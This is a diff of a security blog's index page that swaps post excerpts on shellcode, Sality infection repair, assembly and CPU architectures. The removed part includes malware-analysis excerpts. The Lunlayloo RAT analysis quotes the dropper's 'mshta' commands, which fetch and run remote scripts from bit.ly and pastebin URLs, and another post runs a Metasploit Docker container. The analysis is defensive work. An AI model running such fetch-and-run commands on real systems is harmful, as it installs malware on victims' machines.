@@ -136,25 +136,206 @@
   <div class="row mb-4 mx-auto">
     
     
+      <div class="col-12 col-md-4 m-auto">
+        <a href="/2020/03/01/shellcode基础/" target="_self">
+          <img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302103202.png" srcset="/img/loading.gif" alt="Shellcode基础" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/17/现场木马清理建议/">
+      <a href="/2020/03/01/shellcode基础/">
+        <p class="h4 index-header">Shellcode基础</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">shellcode 基础参考微软官方文档
+几个特性：
+
+
+.NET Core可跨平台，powershell6可在Mac Linux平台使用，大气
+Win10自带组建，功能强大
+
+
+了解Powershell
+输出基于对象
+PowerShell cmdlet 旨在处理对象
+在大多数情况下，可以使用标准 PowerShell 对象语法直接访问数据的各部分
+
+
+命令系列是可扩展的
+可以自己实现函数
+支持批处理文件的脚本
+
+
+PowerShell 处理控制台输入和显示
+在cmdlet 后使用 -？可显示关于此命令的帮助
+
+
+PowerShell 使用某些 C# 语法
+
+了解powershell的名称 1. Cmdlet 使用谓词-名词的名称来减少命令记忆
+ - [PowerShell 批准的谓词]( https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 )
+ 2. Cmdlet 使</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-01&nbsp;&nbsp;
+        
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/shellcode">shellcode</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/19/sality感染修复方案/">
         <p class="h4 index-header"></p>
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">注册表文件隐藏[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]CheckedValue = 0 //此时无法通过文件夹选项设置成功CheckedValue = 1 //Windows默认值把CheckedValue修改成Windows默认值1后，系统恢复正常。
-[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden]这个对隐藏文件有用
-关闭杀软[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Feature]
-网络相关[SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List]
-safe</div>
+          <div class="index-text mb-1">整体结构
+
+修复逻辑为：
+首先模拟执行被感染后的OEP，拿到解密代码处的地址
+
+一直往下，到达第一个ret就会跳往加密代码处
+
+解密代码部分
+
+解密代码约为0x1000字节左右,因为是有随机产生的指令，长度就不确定，但是有一个结束标记特征码为：81F9E2FE00000F8C????FFFFC3
+
+到这就可以修复文件了
+原始OEP保存在shellcode后的0x1774处
+sizoOfImage也能找到，就能恢复了
+
+
+</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-17&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-19&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/14/深入浅出汇编/">
+        <p class="h4 index-header"></p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://bbs.pediy.com/thread-77508.htmhttps://blog.csdn.net/Apollon_krj/article/details/77524601x86指令集设计上就只允许是寄存器和寄存器或寄存器和内存间移动
+x86 profix:26：在指令序列里是：prefix部分，作用是调整内存操作数的段选择子66：在指令序列里是：prefix 部分，作用是调整操作数的缺省大小2E: CS3E: DS26: ES64: FS65: GS36: SSF0: locl指令F2: repneF3: rep repz
+
+
+
+
+
+
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-14&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/09/ARM ARM64 x86/">
+        <p class="h4 index-header"></p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">几种不同CPU架构的区别
+inter  复杂指令集 CISCARM 精简指令集 RISC 
+
+
+
+类型
+Inter
+ARM
+
+
+
+效率
+完成复杂指令效率高，有独立的高级指令
+高级指令全靠多条指令拼凑
+
+
+功耗
+超高性能
+低功耗
+
+
+docker run -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
+mates Break172.17.0.2
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-09&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/23/调试androidLua的so文件/">
+        <p class="h4 index-header"></p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1"></div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-23&nbsp;&nbsp;
         
         
         
@@ -319,13 +500,13 @@ windows 毫不意外的以87%的份额获得了第一
     
     
       <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/12/05/简单PE加载器/" target="_self">
+        <a href="/2019/12/07/简单PE加载器/" target="_self">
           <img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121346.png" srcset="/img/loading.gif" alt="简单PE加载器" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
       </div>
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/05/简单PE加载器/">
+      <a href="/2019/12/07/简单PE加载器/">
         <p class="h4 index-header">简单PE加载器</p>
         
         
@@ -351,7 +532,7 @@ LPBYTE LoadFileToMem(LPCSTR lpFilePath)
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-05&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-07&nbsp;&nbsp;
         
         
         
@@ -409,219 +590,6 @@ WDM驱动无非是微软在NT式驱动之上进行了扩充，过滤驱动也不
             <a href="/tags/%E5%86%85%E6%A0%B8">内核</a>&nbsp;
           
             <a href="/tags/%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0">驱动学习</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/11/09/梯子/" target="_self">
-          <img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121303.png" srcset="/img/loading.gif" alt="PC及安卓翻墙" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/11/09/梯子/">
-        <p class="h4 index-header">PC及安卓翻墙</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">之前写过一篇，但是效果不太理想，现在再总结一下使用中的常见问题
-这是我随意打开的Youtube，连接速度达到了 1M/s  1080是没什么问题了
-PC端
-
-手机端
-各版本下载链接(这些在github上都是开源的，不放心可以自己去找源码编译)
-http://files.huaduo.icu/shadowsocksr/
-PC安装与使用</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-09&nbsp;&nbsp;
-        
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>&nbsp;
-          
-            <a href="/tags/%E4%BB%A3%E7%90%86">代理</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/11/07/监控线程/" target="_self">
-          <img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121437.png" srcset="/img/loading.gif" alt="恶意线程清理" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/11/07/监控线程/">
-        <p class="h4 index-header">恶意线程清理</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？
-下面给出两种方法
-PLAN A来自 加号
-通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用
-void Killing::KillMalRemoteThread()
-{
-    (FARPROC&amp;)ZwQueryInformationThread = GetProcAddress(m_hNtdll, &quot;ZwQueryInformationThread&quot;);
-
-    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    THREADENTRY32 te32;
-
-    te32.dwSize = sizeof(THREADENTRY32);
-    Thread32First(hThreadSnap, &amp;te32);
-    HANDLE hThread;
-    do {
-       </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-11-07&nbsp;&nbsp;
-        
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E9%80%86%E5%90%91">逆向</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/10/10/宏病毒下载器/" target="_self">
-          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_4fc6282a45.jpg" srcset="/img/loading.gif" alt="利用宏-DownLoder" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/10/10/宏病毒下载器/">
-        <p class="h4 index-header">利用宏-DownLoder</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">基本信息
-
-
-FileName
-FileType
-MD5
-Size
-
-
-
-58e4d0.xls
-Downloader
-3effeba64d9a1a4dd1bddaeb1858e4d0
-346112  bytes
-
-
-简介带有恶意宏的office文件，加载dll，下载程序执行
-流程图
-详细分析有宏，会在你允许宏运行的时候执行起来首先会切换目录到TMPT下
-然后会调用窗体UserFrom1的Show方法,也就值展示提示窗体在展示的时候会执行UserFrom_Activate()函数，也就会调用CreatGifFile这个方法这个方法在模块 modle1中定义拼接在TEMP下的路径，根据系统位数走不同分支，我这里是win7 32位下面会拷贝本身到上面拼接好的路径 TempName中，然后复制到ZipName中会把ZipName文件按压缩包打开，取出xl\embeddings\oleObject1.bin保存到Tmp\oleObject.bin中最后会调用ReadAndWriteExtractedBinFile函数，这个函数是在oleObject.bin中找到MZ开头的字符区，然后读取指定字节</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-10-10&nbsp;&nbsp;
-        
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Hexo">Hexo</a>&nbsp;
-          
-            <a href="/tags/Fluid">Fluid</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/09/06/Lunlayloo 木马/" target="_self">
-          <img src="https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg" srcset="/img/loading.gif" alt="Lunlayloo 木马" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/09/06/Lunlayloo 木马/">
-        <p class="h4 index-header">Lunlayloo 木马</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">基本信息
-
-
-FileName
-FileType
-MD5
-Size
-
-
-
-Order____679873892.xls
-rat
-7641FEF8ABC7CB24B66655D11EF3DAF2
-41472 bytes
-
-
-简介该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
-流程图
-详细分析文件有宏，且宏有密码，可以使用offkey直接更改宏密码进入宏代码后在shell(fun)处下断，可以拿到shell 的连接地址 mshta http://bit.ly/8hsshjahassahsh
-打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的拿出来使用console打印出来处理后执行了WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide看看究竟是什么东西木马作者选择了一个匿名代码存放地址网站，来逃避追踪。但是目前这个RWA地址页面已经被删除了这个样本在any.run上有人运行过，有</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-06&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Rat%20H-worm">Rat H-worm</a>&nbsp;
           
         
       </div>
